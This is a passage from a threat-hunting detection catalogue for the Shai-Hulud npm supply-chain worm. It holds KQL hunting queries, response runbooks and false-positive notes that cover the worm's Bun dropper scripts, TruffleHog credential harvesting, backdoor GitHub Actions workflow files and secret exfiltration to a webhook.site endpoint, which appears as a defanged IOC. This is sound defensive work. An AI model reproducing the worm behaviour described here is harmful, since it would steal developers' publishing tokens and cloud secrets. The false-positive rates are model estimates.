1) Triage: pull the full process tree on the host — confirm the parent is npm/node/pip/python (lifecycle hook) and capture the package + version being installed and the SHA256 of the script. 2) Contain: isolate the device, revoke any npm/PyPI/GitHub/cloud publishing tokens that lived on it, and force-rotate credentials referenced in ~/.npmrc, ~/.pypirc and CI secrets. 3) Hunt: search for outbound traffic to webhook.site, new .github/workflows/*.yml writes, and any npm publish activity from this user across the fleet to find lateral republication.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has_any ("setup_bun.js","bun_environment.js")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessCommandLine has_any ("setup_bun.js","bun_environment.js")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

TruffleHog secret-scanning spawned by npm/pip during install (Shai-Hulud credential harvest) AIActions on Objectives Medium
Hunts the Shai-Hulud credential-harvest stage where the malicious postinstall bundle.js downloads and runs TruffleHog to sweep the developer machine for npm/GitHub/AWS/GCP tokens. The discriminator is TruffleHog being launched by a package-manager/runtime process rather than by a CI/security workflow. Rationale: Shai-Hulud's bundle.js is documented (ReversingLabs/Sysdig) to fetch and run TruffleHog to enumerate secrets; the parent-process constraint (node/npm/python) separates worm activity from a security team running TruffleHog manually or in CI. Cross-checked against: • https://www.reversinglabs.com/blog/shai-hulud-worm-npm • https://www.sysdig.com/blog/shai-hulud-the-novel-self-replicating-worm-infecting-hundreds-of-npm-packages
ATT&CKT1552.001 T1059.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • DevSecOps team running TruffleHog in a pre-commit hook invoked by node/python tooling
  • Local secret-scan step in a developer's Makefile/npm script before pushing
  • Editor/IDE extension that shells out to TruffleHog through a Node host process
  • Security engineer ad-hoc scanning a repo from a python virtualenv
Suppression filter
| where InitiatingProcessCommandLine !has "pre-commit" and FolderPath !has "\\.git\\hooks\\"
Response runbook
1) Triage: confirm whether the TruffleHog run is part of a sanctioned scanning workflow; inspect the parent package/version and whether the binary was freshly downloaded to a temp path. 2) Contain: if unsanctioned, isolate the host and rotate every token TruffleHog could have read (npm/PyPI publish tokens, GH PAT, cloud keys). 3) Hunt: pivot to outbound exfil (webhook.site), new GitHub Actions workflow files, and mass npm publish events tied to the same user/token.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName has "trufflehog" or ProcessCommandLine has "trufflehog")
| where InitiatingProcessFileName in~ ("node.exe","npm.cmd","bun.exe","python.exe","pip.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName has "trufflehog" or TargetProcessCommandLine has "trufflehog"
| where ActingProcessName has_any ("node.exe","npm.cmd","bun.exe","python.exe","pip.exe")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

Shai-Hulud/Miasma malicious GitHub Actions workflow file written to .github/workflows AIInstallation High
Hunts on-disk creation of the worm's backdoor CI workflow files (shai-hulud-workflow.yml, shai-hulud.yaml, discussion.yaml) under a repo's .github/workflows directory. These trigger on push and exfiltrate workflow-scoped secrets, and the filenames are confirmed IOCs across multiple vendor write-ups. Rationale: The filenames shai-hulud-workflow.yml / shai-hulud.yaml / discussion.yaml under .github/workflows are documented worm persistence/exfil IOCs (ReversingLabs, Zscaler); pinning to that path keeps the match precise. Cross-checked against: • https://www.reversinglabs.com/blog/shai-hulud-worm-npm • https://www.zscaler.com/blogs/security-research/shai-hulud-campaign-evolution-miasma-hades-and-ai-scanner-evasion
ATT&CKT1546 T1195.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimate repo that genuinely names a workflow discussion.yaml (e.g. GitHub Discussions automation)
  • Internal scaffolding tool that templates many workflow files at once
  • Git checkout/clone of a quarantined sample repo onto an analyst box
  • Security test repo intentionally seeded with the IOC for tabletop exercises
Suppression filter
| where not (FileName =~ "discussion.yaml" and InitiatingProcessFileName in~ ("git.exe","Code.exe"))
Response runbook
1) Triage: open the written YAML and confirm it triggers on push and posts secrets to an external URL; identify the repo and the process that wrote it. 2) Contain: delete the workflow, isolate the host, and invalidate all GitHub Actions/repo secrets and any PAT on the device; check the remote repo for the same file pushed upstream. 3) Hunt: enumerate every repo on the host and across the org for these filenames, and pivot to webhook.site exfil and Bun dropper execution on the same machine.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath has @"\.github\workflows\" or FolderPath has "/.github/workflows/"
| where FileName in~ ("shai-hulud-workflow.yml","shai-hulud.yaml","shai-hulud.yml","discussion.yaml")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFilePath has @"\.github\workflows\" or TargetFilePath has "/.github/workflows/"
| where TargetFileName in~ ("shai-hulud-workflow.yml","shai-hulud.yaml","shai-hulud.yml","discussion.yaml")
| project TimeGenerated, DvcHostname, ActorUsername, TargetFileName, TargetFilePath, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Developer-runtime exfiltration to webhook.site (Shai-Hulud token drop) AIActions on Objectives Medium
Hunts outbound connections to webhook.site initiated by node/bun/python/npm/pip — the secret-exfiltration channel used by Shai-Hulud (confirmed endpoint hxxps://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7). Scoping to package-runtime processes separates worm exfil from humans using webhook.site for legitimate webhook testing. Rationale: webhook.site (and the specific path /bb8ca5f6-4175-45d2-b042-fc9ebb8170b7) is the documented Shai-Hulud exfil sink; constraining the initiator to package runtimes turns a noisy domain into a high-signal supply-chain exfil indicator. Cross-checked against: • https://www.sysdig.com/blog/shai-hulud-the-novel-self-replicating-worm-infecting-hundreds-of-npm-packages • https://www.reversinglabs.com/blog/shai-hulud-worm-npm
ATT&CKT1567 T1071.001
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developer using webhook.site to debug a real webhook integration from a Node/Python test script
  • QA harness posting test events to a webhook.site bin
  • Automated integration tests that mock callbacks via webhook.site
  • Sentinel DNS-only view firing on webhook.site lookups with no malicious payload (no process context available)
Suppression filter
DeviceNetworkEvents | where InitiatingProcessCommandLine !has "test" and InitiatingProcessCommandLine !has "webhook-test"
Response runbook
1) Triage: identify the initiating process/package and capture the POST body or DNS frequency; a single token-shaped POST right after install is malicious, repeated test traffic is likely benign. 2) Contain: isolate the host and rotate npm/PyPI/GitHub/cloud credentials that were on disk; block the webhook.site bin at the proxy. 3) Hunt: correlate with setup_bun.js/bun_environment.js execution and new .github/workflows files on the same host, and check other hosts beaconing the same webhook.site path.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "webhook.site"
| where InitiatingProcessFileName in~ ("node.exe","npm.cmd","bun.exe","python.exe","pip.exe","git.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
ImDnsActivity
| where TimeGenerated > ago(30d)
| where DnsQuery has "webhook.site"
| project TimeGenerated, SrcIpAddr, SrcHostname, SrcUsername, DnsQuery
| order by TimeGenerated desc
